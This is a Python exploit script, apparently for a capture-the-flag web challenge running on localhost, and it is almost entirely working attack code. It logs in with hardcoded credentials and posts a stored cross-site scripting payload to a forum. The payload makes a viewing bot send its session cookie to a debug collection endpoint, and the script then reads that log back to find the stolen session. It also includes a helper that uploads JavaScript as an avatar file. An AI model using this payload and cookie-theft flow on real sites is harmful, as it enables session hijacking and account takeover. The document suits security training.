#show off /api/collect on forum post source: <!-- wil: left /api/collect up from when I was debugging the bot — it logs whatever you throw at ?c= and hands it all back on GET. sophie: that is an open exfil log. wil: it's a DEBUG endpoint. -->
#get bot cookie through newsletter.
import sys
import requests
from bs4 import BeautifulSoup

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

BASE_URL = "http://localhost:4942"

IDENTITY = "jdoe@student.42.tech"
PASSWORD = "abc123"

def login():
    auth = requests.post(
        f"{BASE_URL}/login",
        data={"identity": IDENTITY, "password": PASSWORD},
        allow_redirects=False
    )
    cookies = auth.cookies
    if not cookies.get("session"):
        print(f"{RED}Login failed - no session cookie received{RESET}")
        print("Status:", auth.status_code)
        print(auth.text[:200])
        sys.exit(1)
    print(f"{GREEN}Logged in successfully as {IDENTITY}{RESET}")
    return cookies


def collect(cookies):
    r = requests.get(f"{BASE_URL}/api/collect", cookies=cookies)
    print(f"{CYAN}--- /api/collect ---{RESET}")
    print("Status:", r.status_code)
    print(r.text)

def collect2():
    r = requests.get(f"{BASE_URL}/api/collect")
    print(f"{CYAN}--- /api/collect ---{RESET}")
    print("Status:", r.status_code)
    return r


def upload(cookies, filepath):
    filename = filepath.split("/")[-1]
    with open(filepath, "rb") as f:
        r = requests.post(
            f"{BASE_URL}/upload/avatar",
            files={"file": (filename, f, "text/javascript")},
            cookies=cookies,
            headers={
                "Origin": BASE_URL,
                "Referer": f"{BASE_URL}/profile/me/settings",
            },
            allow_redirects=False
        )
    print(f"{CYAN}--- upload ---{RESET}")
    print("Status:", r.status_code)
    print("Location:", r.headers.get("Location", "none"))
    print(r.text[:500])


def post_forum(cookies, title, content):
    r = requests.post(
        f"{BASE_URL}/forum/new",
        data={"content": content, "title": title},
        cookies=cookies,
        allow_redirects=False
    )
    botbait = "title = forumbotbait content = <script>fetch(`/api/collect?c=${encodeURIComponent(document.cookie)}`);</script>"
    print("posting botbait: " + botbait)
    print("Status:", r.status_code)
    print(r.text[:500])


def findflag():
    import re

    response = collect2()
    m = re.search(r"session.{0,250}", response.text)
    print(m.group())



def usage():
    print(f"""
{CYAN}Usage:{RESET}
  python3 script.py collect 
  python3 script.py forum 'title' 'content'
  python3 script.py forumbotbait
  python3 script.py collect
  python3 script.py flag
""")




def main():
    if len(sys.argv) < 2:
        usage()
        sys.exit(1)

    cmd = sys.argv[1]


    if cmd == "collect":
        cookies = login()
        collect(cookies)

    elif cmd == "forum":
        cookies = login()
        post_forum(cookies, sys.argv[2], sys.argv[3])

    elif cmd == "forumbotbait":
        cookies = login()
        post_forum(cookies, "forumbotbait","<script>fetch(`/api/collect?c=${encodeURIComponent(document.cookie)}`);</script>" )

    elif cmd == "flag":
        findflag()

    else:
        print(f"{RED}Unknown command: {cmd}{RESET}")
        usage()
        sys.exit(1)


if __name__ == "__main__":
    main()
